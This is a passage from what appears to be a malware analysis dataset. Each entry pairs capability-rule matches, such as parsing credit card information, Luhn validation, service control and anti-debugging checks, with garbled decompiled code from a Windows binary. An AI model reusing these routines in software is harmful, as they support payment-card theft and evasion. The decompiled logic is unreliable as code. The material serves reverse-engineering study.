unreachable block (ram,0x0040441a)\n// WARNING: Removing unreachable block (ram,0x00404324)\n// WARNING: Removing unreachable block (ram,0x00404336)\n// WARNING: Removing unreachable block (ram,0x0040433c)\n// WARNING: Removing unreachable block (ram,0x00404347)\n// WARNING: Removing unreachable block (ram,0x0040434d)\n// WARNING: Removing unreachable block (ram,0x004042a7)\n// WARNING: Removing unreachable block (ram,0x004042b2)\n// WARNING: Removing unreachable block (ram,0x004042b8)\n// WARNING: Removing unreachable block (ram,0x004042c3)\n// WARNING: Removing unreachable block (ram,0x004042c9)\n// WARNING: Removing unreachable block (ram,0x0040435e)\n// WARNING: Removing unreachable block (ram,0x004041ef)\n// WARNING: Removing unreachable block (ram,0x004041fa)\n// WARNING: Removing unreachable block (ram,0x0040423f)\n// WARNING: Removing unreachable block (ram,0x00404245)\n// WARNING: Removing unreachable block (ram,0x00404250)\n// WARNING: Removing unreachable block (ram,0x00404256)\n// WARNING: Removing unreachable block (ram,0x00404362)\n// WARNING: Removing unreachable block (ram,0x0040437a)\n// WARNING: Removing unreachable block (ram,0x004043f9)\n// WARNING: Removing unreachable block (ram,0x0040443c)\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __cdecl fcn.00403f50(uint8_t *hWnd)\n\n{\n    uint uVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    code *pcVar4;\n    uint32_t uVar5;\n    uint unaff_ESI;\n    uint *unaff_EDI;\n    uint *puVar6;\n    ushort in_SS;\n    uint *in_FS_OFFSET;\n    bool bVar7;\n    bool bVar8;\n    ulong uVar9;\n    uint var_24ch;\n    uint var_147h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint pbstr;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint *var_24h;\n    uint32_t var_20h;\n    uint var_1ch;\n    uint lpdwResult;\n    uint var_14h;\n    int32_t *var_10h;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_1ch._3_1_ = unaff_ESI >> 0x18;\n    var_20h._0_3_ = SUB43(unaff_EDI, 0);\n    var_20h._3_1_ = unaff_EDI >> 0x18;\n    unique0x100005d5 = CONCAT31(unaff_ESI, var_20h._3_1_);\n    var_24h._3_1_ = hWnd >> 0x18;\n    uVar9 = (*_sym.imp.MSVCRT.dll__strlwr)();\n    var_24h._3_1_ = uVar9 >> 0x18;\n    var_28h._0_1_ = uVar9 >> 0x20;\n    bVar8 = ((CONCAT11((uVar9 >> 8) + -0x2b, uVar9) ^ 0x3d) + 0x7c28 ^ CONCAT11(uVar9 >> 0x28 | var_28h, var_28h)) ==\n            0x4001;\n    uVar5 = uVar9 >> 0x20 & 0xffffff;\n    var_14h = 0x411530;\n    var_10h = 0x411528;\n    var_ch = 0x411538;\n    var_8h = 0x411540;\n    var_4h = 0x411548;\n    if ((bVar8) || (stack0xffffffdb = CONCAT31(var_20h, var_20h._3_1_),  !bVar8)) {\n        puVar6 = NULL;\n    }\n    else {\n        puVar6 = unaff_EDI + 1;\n        uVar1 = in(uVar5);\n        *unaff_EDI = uVar1;\n        if (&var_20h < 1) {\n            while( true ) {\n                (*_sym.imp.ole32.dll_CoInitialize)(0, puVar6);\n                puVar6 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(0x4114e8);\n                bVar8 = false;\n                bVar7 = (POPCOUNT(puVar6 & 0xff) & 1U) == 0;\n                if (puVar6 == NULL) {\n                    *in_FS_OFFSET = var_ch;\n                    return 1;\n                }\n                (*_sym.imp.USER32.dll_RegisterWindowMessageA)(0x4114f4);\n                if ((bVar7) || (!bVar7)) break;\n                segment(in_SS, *0x10 + -0x21);\n                if (bVar8) {\n                    *(puVar6 + -1) = *(puVar6 + -1) + -0x5b;\n                    break;\n                }\n                if (!bVar7) {\n                    stack0xffffffdf = 0xb7bc9ea5;\n                    break;\n                }\n                unique0x00005080 = *in_FS_OFFSET;\n                *in_FS_OFFSET = &var_24h + 3;\n            }\n            unique0x00001d00 = &lpdwResult;\n            (*_sym.imp.USER32.dll_SendMessageTimeoutA)();\n            pcVar4 = (*_sym.imp.KERNEL32.dll_GetProcAddress)();\n            if (pcVar4 != NULL) {\n                unique0x10000529 = stack0xffffffdb & 0xff;\n                unique0x10000535 = stack0xffffffdf & 0xffffff00;\n                var_4h = 0;\n                uVar5 = (*pcVar4)();\n                piVar2 = CONCAT13(var_20h._3_1_, var_20h);\n                if ((uVar5 < 0) || (piVar2 == NULL)) {\n                    var_4h = 0xffffffff;\n                    if (piVar2 != NULL) {\n                        (**(*piVar2 + 8))();\n                    }\n                }\n                else {\n                    unique0x10000549 = stack0xffffffdb & 0xffffff00;\n                    var_4h._0_1_ = 1;\n                    uVar5 = (**(*piVar2 + 0x20))();\n                    piVar2 = stack0xffffffdb << 0x18;\n                    if ((uVar5 < 0) || (piVar2 == NULL)) {\n                        var_4h = var_4h._1_3_ << 8;\n                        if (piVar2 != NULL) {\n                            (**(*piVar2 + 8))();\n                        }\n                        var_4h = 0xffffffff;\n                        if (CONCAT13(var_20h._3_1_, var_20h) != NULL) {\n                            (**(*CONCAT13(var_20h._3_1_, var_20h) + 8))();\n                        }\n                    }\n                    else {\n                        unique0x10000551 = stack0xffffffdf & 0xff;\n                        var_1ch._3_1_ = 0;\n                        (**(*piVar2 + 0x24))();\n                        if (0 < CONCAT13(var_1ch._3_1_, var_1ch)) {\n                            (*_sym.imp.MSVCRT.dll_rand)();\n                            var_10h = NULL;\n                            var_4h._0_1_ = 4;\n                            uVar5 = (**(*(stack0xffffffdb << 0x18) + 0x2c))();\n                            var_4h._0_1_ = 3;\n                            if (var_10h != NULL) {\n                                (**(*var_10h + 8))();\n                            }\n                            var_4h._0_1_ = 2;\n                            (*_sym.imp.OLEAUT32.dll_VariantCopy)();\n                        }\n                        var_4h = var_4h._1_3_ << 8;\n                        if (stack0xffffffdb << 0x18 != NULL) {\n                            (**(*(stack0xffffffdb << 0x18) + 8))();\n                        }\n                        var_4h = 0xffffffff;\n                        if (CONCAT13(var_20h._3_1_, var_20h) != NULL) {\n                            (**(*CONCAT13(var_20h._3_1_, var_20h) + 8))();\n                        }\n                    }\n                }\n                (*_sym.imp.KERNEL32.dll_FreeLibrary)();\n                (*_sym.imp.ole32.dll_CoUninitialize)();\n                *in_FS_OFFSET = var_ch;\n                return uVar5;\n            }\n            *in_FS_OFFSET = var_ch;\n            return 1;\n        }\n    }\n    do {\n        *hWnd = *hWnd ^ uVar5 >> 8;\n        uVar9 = (*_sym.imp.MSVCRT.dll_strstr)();\n        uVar5 = uVar9 >> 0x20;\n        if (uVar9 != 0) {\n            return 1;\n        }\n        puVar6 = puVar6 + 1;\n    } while (puVar6 < 0x5);\n    iVar3 = (*_sym.imp.MSVCRT.dll_strstr)();\n    return iVar3 == 0;\n}\n",
        "token_count": 2673
    },
    "00403e60": {
        "rules": [
            "check OS version/56128ea24265487c97cb4913628bf489"
        ],
        "decompiled_code": "\nbool fcn.00403e60(void)\n\n{\n    uchar *puVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uchar pvData;\n    uint var_10bh;\n    uint pdwType;\n    uint pcbData;\n    \n    pvData = 0;\n    puVar3 = &var_10bh;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    *puVar3 = 0;\n    pcbData = 0x104;\n    *(puVar3 + 2) = 0;\n    iVar2 = (*_sym.imp.SHLWAPI.dll_SHGetValueA)(0x80000002, 0x411550, 0x411578, &pdwType, &pvData, &pcbData);\n    if (iVar2 != 0) {\n        return false;\n    }\n    puVar1 = (*_sym.imp.MSVCRT.dll_strchr)(&pvData, 0x2e);\n    if (puVar1 == NULL) {\n        return false;\n    }\n    *puVar1 = 0;\n    iVar2 = (*_sym.imp.MSVCRT.dll_atoi)(&pvData);\n    if (iVar2 == 6) {\n        return true;\n    }\n    return iVar2 == 7;\n}\n",
        "token_count": 317
    },
    "004017d0": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004017d0(uint arg_8h)\n\n{\n    uint hSCManager;\n    uint uVar1;\n    uint hSCObject;\n    \n    hSCManager = (*_sym.imp.ADVAPI32.dll_OpenSCManagerA)(0, 0, 0xf003f);\n    uVar1 = fcn.004027a0(hSCManager, arg_8h);\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(hSCManager);\n    return uVar1;\n}\n",
        "token_count": 113
    },
    "00401ae0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid fcn.00401ae0(uint param_1)\n\n{\n    uint uStack48;\n    uint uStack44;\n    code *pcStack40;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    uint uStack24;\n    uint uStack20;\n    uint uStack16;\n    uint uStack12;\n    uint uStack8;\n    uint uStack4;\n    \n    uStack48 = 0x30;\n    uStack44 = 3;\n    pcStack40 = fcn.00401610;\n    uStack36 = 0;\n    uStack32 = 0;\n    uStack28 = param_1;\n    uStack24 = 0;\n    uStack20 = 0;\n    uStack16 = 0;\n    uStack12 = 0;\n    uStack8 = 0x407010;\n    uStack4 = 0;\n    (*_sym.imp.USER32.dll_RegisterClassExA)(&uStack48);\n    return;\n}\n",
        "token_count": 217
    },
    "00401bd0": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00401c49) overlaps instruction at (ram,0x00401c45)\n// \n\nvoid __cdecl fcn.00401bd0(uint *arg_8h, int32_t arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint16_t uVar1;\n    uint32_t *puVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    uchar *puVar6;\n    uint *unaff_EDI;\n    bool bVar7;\n    bool bVar8;\n    uint var_4h;\n    \n    puVar6 = &stack0xfffffffc;\n    uVar1 = fcn.00402b30(0, arg_8h, arg_ch + 1U >> 1);\n    uVar4 = uVar1;\n    bVar7 = false;\n    bVar8 = uVar4 == 0;\n    puVar2 = (*_sym.imp.dbghelp.dll_ImageNtHeader)(arg_8h);\n    if (!bVar7 && !bVar8) {\n        uVar4 = uVar1 & 0xff | (uVar4 >> 8) << 8;\n        if (bVar7 || bVar8) {\n            *unaff_EDI = *arg_8h;\n            uVar4 = CONCAT11(0xdf, uVar1 & 0xff);\n            puVar6 = 0x8be181d0;\n            uVar3 = *puVar2;\n            goto code_r0x00401c4c;\n        }\n    }\n    uVar3 = puVar2[0x16];\ncode_r0x00401c4c:\n    *(puVar6 + 8) = uVar3;\n    if (uVar4 < uVar3) {\n        iVar5 = (uVar4 - uVar3 & 0xffff) - 1;\n    }\n    else {\n        iVar5 = uVar4 - (uVar3 & 0xffff);\n    }\n    uVar4 = *(puVar6 + 8) >> 0x10;\n    if (iVar5 < *(puVar6 + 8) >> 0x10) {\n        iVar5 = (iVar5 - uVar4 & 0xffff) - 1;\n    }\n    else {\n        iVar5 = iVar5 - uVar4;\n    }\n    **(puVar6 + 0x14) = iVar5 + *(puVar6 + 0xc);\n    **(puVar6 + 0x10) = *(*(puVar6 + -4) + 0x58);\n    return;\n}\n",
        "token_count": 585
    },
    "00401d10": {
        "rules": [
            "parse credit card information/0fcc6283562247e58776c7b51a92f681"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00401dfe) overlaps instruction at (ram,0x00401dfc)\n// \n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.00401d10(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uchar lpBuffer;\n    uint var_20fh;\n    uchar s;\n    uint var_10bh;\n    uint var_8h;\n    uint var_4h;\n    \n    lpBuffer = 0;\n    puVar2 = &var_20fh;\n    for (iVar1 = 0x40; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    s = 0;\n    puVar2 = &var_10bh;\n    for (iVar1 = 0x40; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)();\n    (*_sym.imp.MSVCRT.dll_sprintf)(&s, 0x411114, &lpBuffer, arg_8h);\n    fcn.00402d60(&var_4h, &var_8h);\n    fcn.00401e20(var_4h);\n    iVar1 = fcn.00401100(&s, var_4h, var_8h);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    if ((-1 < iVar1) && (-1 >= iVar1)) {\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    }\n    fcn.00401230(&s, 0xffffffff);\n    return 1;\n}\n",
        "token_count": 480
    },
    "00402c30": {
        "rules": [
            "parse credit card information/0fcc6283562247e58776c7b51a92f681",
            "parse credit card information/0fcc6283562247e58776c7b51a92f681"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00402d51) overlaps instruction at (ram,0x00402d50)\n// \n// WARNING: Removing unreachable block (ram,0x00402cd6)\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.00402c30(uchar *arg_8h, uint arg_ch)\n\n{\n    uint8_t *puVar1;\n    char cVar2;\n    uint8_t uVar3;\n    uint uVar4;\n    uint32_t uVar5;\n    uint16_t uVar6;\n    uint32_t in_ECX;\n    uint32_t in_EDX;\n    uint *puVar7;\n    int32_t unaff_EBX;\n    uint *puVar8;\n    uchar *puVar9;\n    uint32_t *unaff_EDI;\n    char *pcVar10;\n    bool bVar11;\n    bool bVar12;\n    uchar *puStackY24203;\n    int32_t iStackY24195;\n    ushort uStackY24183;\n    ushort uStackY24181;\n    int32_t iStackY24171;\n    \n    puVar7 = &stack0xfffffffc;\n    puVar8 = &stack0xfffffffc;\n    *arg_8h = 0x8d;\n    bVar11 = (POPCOUNT(in_EDX >> 8 & 0x12) & 1U) != 0;\n    arg_8h[1] = 0xca;\n    if ((bVar11) && (!bVar11)) {\n        puVar8 = &stack0xffffffec;\n        cVar2 = '\\x1e';\n        do {\n            puVar7 = puVar7 + -1;\n            puVar8 = puVar8 + -1;\n            *puVar8 = *puVar7;\n            cVar2 = cVar2 + -1;\n        } while ('\\0' < cVar2);\n        uVar4 = in(0x78);\n        return uVar4;\n    }\n    arg_8h[2] = 0xd4;\n    arg_8h[3] = 0xa0;\n    uVar6 = in_ECX | 0x31fd;\n    bVar12 = uVar6 == 0;\n    bVar11 = (POPCOUNT(uVar6 & 0xff) & 1U) == 0;\n    arg_8h[4] = 0xf0;\n    if ((!bVar12) && (bVar12)) {\n        do {\n    // WARNING: Do nothing block with infinite loop\n        } while( true );\n    }\n    arg_8h[5] = 0x94;\n    if ((-1 < uVar6) && (-1 >= uVar6)) {\n        pcVar10 = unaff_EDI | &stack0xfffffffc;\n        unaff_EDI = pcVar10 + 1;\n        *pcVar10 = arg_8h;\n        in_EDX = in_EDX & 0xffffff00;\n        uVar6 = arg_8h + (arg_8h >> 8) * 'y';\n        arg_8h = arg_8h & 0xffff0000 | uVar6;\n        bVar12 = uVar6 == 0;\n        bVar11 = (POPCOUNT(uVar6) & 1U) == 0;\n    }\n    arg_8h[6] = 0xe2;\n    if ((bVar11) || (!bVar11)) {\n        arg_8h[7] = 0x78;\n        puStackY24203 = &stack0xfffffffc;\n        if ((!bVar12) && (puStackY24203 = &stack0xfffffffc,  bVar12)) {\n            puVar7 = &stack0xffffffec;\n            puStackY24203 = &stack0xffffffec;\n            cVar2 = '\\x10';\n            do {\n                puVar8 = puVar8 + -1;\n                puVar7 = puVar7 + -1;\n                *puVar7 = *puVar8;\n                cVar2 = cVar2 + -1;\n            } while ('\\0' < cVar2);\n        }\n    }\n    else {\n        puVar9 = *0xc617b43a;\n        uVar5 = in_EDX + 2;\n        if (uVar5 < 0) {\n            pcVar10 = in_ECX + 0x18;\n            *pcVar10 = *pcVar10 >> 0xd;\n            if (SCARRY4(in_EDX + 1, 1) != *pcVar10 < '\\0') {\n                *(puVar9 + -4) = uVar5;\n                puVar9[-0x68] = uVar5;\n                for (; in_ECX != 0; in_ECX = in_ECX - 1) {\n                    *unaff_EDI = uVar5;\n                    unaff_EDI = unaff_EDI + 1;\n                }\n                *unaff_EDI = uVar5;\n                *(unaff_EDI + 2) = uVar5;\n                bVar11 = false;\n                uVar4 = fcn.00402c30(puVar9 + -0x68, puVar9 + -4);\n                if ((!bVar11) && (bVar11)) {\n                    out(0xbd, uVar4);\n                    return uVar4;\n                }\n                uVar4 = fcn.00402bc0(puVar9 + -0x68, *(puVar9 + -4), 0x411580, 0x12000);\n                puVar7 = *(puVar9 + 0xc);\n                **(puVar9 + 8) = 0x411580;\n                *puVar7 = 0x12000;\n                return uVar4;\n            }\n            goto code_r0x00402d0c;\n        }\n        arg_8h = uVar5 | 0x8bff8b66;\n        puVar1 = unaff_EDI + -0x37fb8a25;\n        uVar3 = in_ECX & 7;\n        *puVar1 = *puVar1 << uVar3 | *puVar1 >> 8 - uVar3;\n        unaff_EBX = (unaff_EBX - *0x34a96d05) - ((in_ECX & 0x1f) != 0 && (*puVar1 & 1) != 0);\n        puStackY24203 = puVar9;\n    }\n    arg_8h[8] = 0xa1;\n    uStackY24183 = SUB42(arg_8h, 0);\n    uStackY24181 = arg_8h >> 0x10;\n    iStackY24195 = unaff_EBX;\ncode_r0x00402d0c:\n    *(*(puStackY24203 + 8) + 9) = 0x18;\n    puVar7 = *(puStackY24203 + 8);\n    *(puVar7 + 10) = 0xd0;\n    bVar11 = (POPCOUNT(uStackY24183 + -1) & 1U) == 0;\n    *(puVar7 + 0xb) = 0x80;\n    if ((bVar11) || (!bVar11)) {\n        puVar7 = *(puStackY24203 + 0xc);\n        iStackY24195 = iStackY24171;\n    }\n    *(iStackY24195 + 0x5e5f0c55) = *(iStackY24195 + 0x5e5f0c55) | 0x5b;\n    *puVar7 = 0xc;\n    return CONCAT22(uStackY24181, uStackY24183);\n}\n",
        "token_count": 1715
    },
    "00403740": {
        "rules": [
            "parse credit card information/0fcc6283562247e58776c7b51a92f681",
            "parse credit card information/0fcc6283562247e58776c7b51a92f681"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00403a5d) overlaps instruction at (ram,0x00403a5a)\n// \n// WARNING: Removing unreachable block (ram,0x00403a5d)\n\nvoid __fastcall fcn.00403740(int32_t *param_1)\n\n{\n    char *pcVar1;\n    uint8_t *puVar2;\n    uint32_t uVar3;\n    uchar uVar4;\n    int32_t iVar5;\n    uint8_t uVar6;\n    uint16_t uVar7;\n    uint8_t uVar8;\n    uint16_t extraout_CX;\n    ushort extraout_CX_00;\n    char extraout_CH;\n    int32_t extraout_ECX;\n    uint8_t extraout_DL;\n    char extraout_DH;\n    int32_t extraout_EDX;\n    uint16_t unaff_BX;\n    uint32_t unaff_EBP;\n    uint *unaff_ESI;\n    uint *unaff_EDI;\n    bool in_CF;\n    bool bVar9;\n    bool in_ZF;\n    bool bVar10;\n    char cVar11;\n    char cVar12;\n    ulong uVar13;\n    uint in_stack_00000003;\n    uint *arg_ch;\n    uint arg_14h;\n    unkbyte3 Var14;\n    ushort uVar15;\n    uchar uVar16;\n    uchar uVar17;\n    uchar in_stack_ffffffec;\n    uchar uVar18;\n    uchar in_stack_ffffffed;\n    uchar uVar19;\n    uchar in_stack_ffffffee;\n    uchar uVar20;\n    uchar in_stack_ffffffef;\n    uchar uVar21;\n    uchar in_stack_fffffff0;\n    uchar uVar22;\n    uchar in_stack_fffffff1;\n    uchar uVar23;\n    uchar in_stack_fffffff2;\n    uchar uVar24;\n    uchar in_stack_fffffff3;\n    \n    if ((in_CF || in_ZF) || (!in_CF && !in_ZF)) {\n        in_stack_fffffff0 = 0x11;\n        in_stack_fffffff1 = 0;\n        in_stack_fffffff2 = 0;\n        in_stack_fffffff3 = 0;\n        in_stack_ffffffec = 0;\n        in_stack_ffffffed = 0x11;\n        in_stack_ffffffee = 0x41;\n        in_stack_ffffffef = 0;\n    }\n    else {\n        *unaff_EDI = *unaff_ESI;\n        unaff_BX = CONCAT11(0xdf, unaff_BX);\n        unaff_EBP = 0x6ae181d0;\n        *param_1 = &stack0xfffffff4 + (0x951e7e2f < unaff_EDI) + *param_1;\n        unaff_ESI = unaff_ESI + 1;\n        unaff_EDI = unaff_EDI + 1;\n    }\n    fcn.00403030(0x407014, 9, \n                 CONCAT13(in_stack_ffffffef, CONCAT12(in_stack_ffffffee, CONCAT11(in_stack_ffffffed, in_stack_ffffffec))\n                         ), \n                 CONCAT13(in_stack_fffffff3, CONCAT12(in_stack_fffffff2, CONCAT11(in_stack_fffffff1, in_stack_fffffff0))\n                         ));\n    fcn.00403030(0x407014, 9, 0x41131c, 0xf);\n    fcn.00403030(0x407014, 9, 0x41132c, 0x1a);\n    iVar5 = fcn.00403030(0x407014, 9, 0x411380, 10);\n    iVar5 = extraout_ECX - iVar5;\n    uVar7 = iVar5 & 0xff00 | iVar5 ^ iVar5 >> 8 | 0x3d00 | unaff_BX;\n    uVar6 = uVar7;\n    uVar8 = uVar7 >> 8;\n    bVar9 = uVar8 < uVar6;\n    bVar10 = uVar8 == uVar6;\n    uVar4 = 0;\n    Var14 = 0x407014;\n    fcn.00403030(0x407014, 9, 0x41138c, 0xb);\n    if ((!bVar9 && !bVar10) && (bVar9 || bVar10)) {\n        unaff_ESI = CONCAT13(uVar4, Var14);\n    }\n    fcn.00403030(0x407014, 9, 0x411398, 8);\n    fcn.00403030(0x407014, 9, 0x4113a0, 9);\n    fcn.00403030(0x407014, 9, 0x4113ac, 9);\n    bVar9 = false;\n    uVar4 = 0x14;\n    uVar15 = 0x4070;\n    uVar16 = 0;\n    fcn.00403030(0x407014, 9, 0x4113b8, 9);\n    if ((!bVar9) && (bVar9)) {\n        *CONCAT13(uVar16, CONCAT21(uVar15, uVar4)) = in_stack_00000003;\n        return;\n    }\n    fcn.00403030(0x407014, 9, 0x4113c4, 0xc);\n    arg_ch = unaff_EDI;\n    fcn.00403030(0x407014, 9, 0x4113d0, 3);\n    fcn.00403030(0x407014, 9, 0x4113d4, 10);\n    fcn.00403030(0x407014, 9, 0x4113e0, 0x40);\n    cVar12 = '\\0';\n    cVar11 = '\\0';\n    bVar9 = (((extraout_CX & 0x4ed ^ 0x3f6f) >> 8) + extraout_DH & 0x5bU) == 0;\n    uVar21 = 0x20;\n    uVar22 = 0x14;\n    uVar23 = 0x41;\n    uVar24 = 0;\n    uVar17 = 9;\n    uVar18 = 0;\n    uVar19 = 0;\n    uVar20 = 0;\n    uVar4 = 0x14;\n    uVar15 = 0x4070;\n    uVar16 = 0;\n    uVar13 = fcn.00403030(0x407014, 9, 0x411420, 0xc);\n    if ((bVar9 || cVar12 != cVar11) || (!bVar9 && cVar12 == cVar11)) {\n        unaff_ESI = 0x9;\n    }\n    puVar2 = uVar13 + 0x6a39da56;\n    *puVar2 = *puVar2 ^ extraout_CX_00;\n    uVar3 = *(uVar13 + 0x2c);\n    pcVar1 = (uVar13 >> 0x20) + 9;\n    *pcVar1 = *pcVar1 + (extraout_CX_00 >> 8);\n    bVar9 = *pcVar1 < '\\0';\n    arg_14h = 0x4039dd;\n    fcn.00403030(0x407014, CONCAT13(uVar16, CONCAT21(uVar15, uVar4)), \n                 CONCAT13(uVar20, CONCAT12(uVar19, CONCAT11(uVar18, uVar17))), \n                 CONCAT13(uVar24, CONCAT12(uVar23, CONCAT11(uVar22, uVar21))));\n    if ((bVar9) || (!bVar9)) {\n        arg_14h = 4;\n        unaff_ESI = 0x411438;\n        arg_ch = 0x9;\n    }\n    *(extraout_EDX + 9) = *(extraout_EDX + 9) + extraout_CH;\n    fcn.00403030(0x407014, arg_ch, unaff_ESI, arg_14h);\n    cVar12 = '\\0';\n    cVar11 = (extraout_DL & unaff_BX + 1U) < '\\0';\n    uVar4 = fcn.00403030(0x407014, 9, 0x41143c, 4);\n    if ((cVar12 == cVar11) && (cVar12 != cVar11)) {\n        *(unaff_EDI | unaff_EBP | uVar3) = uVar4;\n    }\n    fcn.00403030(0x407014, 9, 0x411440, 0xc);\n    fcn.00403030(0x407014, 9, 0x41144c, 4);\n    fcn.00403030(0x407014, 9, 0x411450, 9);\n    fcn.00403030(0x407014, 9, 0x41145c, 0x16);\n    fcn.00403030(0x407014, 9, 0x411474, 7);\n    return;\n}\n",
        "token_count": 2054
    },
    "00404e80": {
        "rules": [
            "parse credit card information/0fcc6283562247e58776c7b51a92f681",
            "parse credit card information/0fcc6283562247e58776c7b51a92f681"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00404ea9) overlaps instruction at (ram,0x00404ea8)\n// \n// WARNING: Removing unreachable block (ram,0x00404ea9)\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.00404e80(uint arg_8h, uint arg_ch)\n\n{\n    uint in_EAX;\n    uint hSCManager;\n    uint uVar1;\n    uint *unaff_EDI;\n    char in_SF;\n    char in_OF;\n    uint var_4h;\n    \n    if (in_OF == in_SF) {\n        if (in_OF != in_SF) {\n            out(0xc4, in_EAX);\n            *unaff_EDI = in_EAX;\n        }\n    }\n    hSCManager = (*_sym.imp.ADVAPI32.dll_OpenSCManagerA)();\n    fcn.004018d0(hSCManager, arg_8h);\n    uVar1 = fcn.004013a0(hSCManager, arg_8h, arg_ch);\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(hSCManager);\n    return uVar1;\n}\n",
        "token_count": 258
    },
    "00404670": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00404670(void)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    code *pcVar3;\n    int32_t iVar4;\n    uint *puVar5;\n    uchar var_260h;\n    uint var_25fh;\n    uchar var_15ch;\n    uint var_15bh;\n    uint var_58h;\n    uint var_2ch;\n    uint var_28h;\n    int32_t var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.00403b20();\n    iVar4 = fcn.00403e60();\n    if (iVar4 != 0) {\n        var_260h = 0;\n        puVar5 = &var_25fh;\n        for (iVar4 = 0x40; iVar4 != 0; iVar4 = iVar4 + -1) {\n            *puVar5 = 0;\n            puVar5 = puVar5 + 1;\n        }\n        *puVar5 = 0;\n        *(puVar5 + 2) = 0;\n        iVar4 = (*_sym.imp.SHELL32.dll_SHGetSpecialFolderPathA)(0, &var_260h, 0x26, 0);\n        if (iVar4 != 0) {\n            fcn.00402050();\n            var_15ch = 0;\n            puVar5 = &var_15bh;\n            for (iVar4 = 0x40; iVar4 != 0; iVar4 = iVar4 + -1) {\n                *puVar5 = 0;\n                puVar5 = puVar5 + 1;\n            }\n            *puVar5 = 0;\n            *(puVar5 + 2) = 0;\n            (*_sym.imp.MSVCRT.dll_sprintf)(&var_15ch, 0x41149c, &var_260h, 0x41147c, 3);\n            pcVar3 = _sym.imp.USER32.dll_EnumWindows;\n            pcVar1 = _sym.imp.KERNEL32.dll_Sleep;\n            var_14h = 0;\n            do {\n                puVar5 = &var_58h;\n                for (iVar4 = 0x11; iVar4 != 0; iVar4 = iVar4 + -1) {\n                    *puVar5 = 0;\n                    puVar5 = puVar5 + 1;\n                }\n                var_28h._0_2_ = 0;\n                var_10h = 0;\n                var_ch = 0;\n                var_58h = 0x44;\n                var_8h = 0;\n                var_2ch = 1;\n                var_4h = 0;\n                iVar4 = (*_sym.imp.KERNEL32.dll_CreateProcessA)(0, &var_15ch, 0, 0, 0, 0, 0, 0, &var_58h, &var_10h);\n                if (iVar4 == 0) {\n                    return;\n                }\n                (*pcVar1)(3000);\n                (*pcVar3)(fcn.00404560, var_8h);\n                iVar4 = (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(var_10h, 1000);\n                if (iVar4 == 0x102) {\n                    (*_sym.imp.KERNEL32.dll_TerminateProcess)(var_10h, 1);\n                }\n                pcVar2 = _sym.imp.KERNEL32.dll_CloseHandle;\n                (*_sym.imp.KERNEL32.dll_CloseHandle)(var_ch);\n                (*pcVar2)(var_10h);\n                var_14h = var_14h + 1;\n            } while (var_14h < 1);\n        }\n    }\n    return;\n}\n",
        "token_count": 854
    },
    "00404880": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
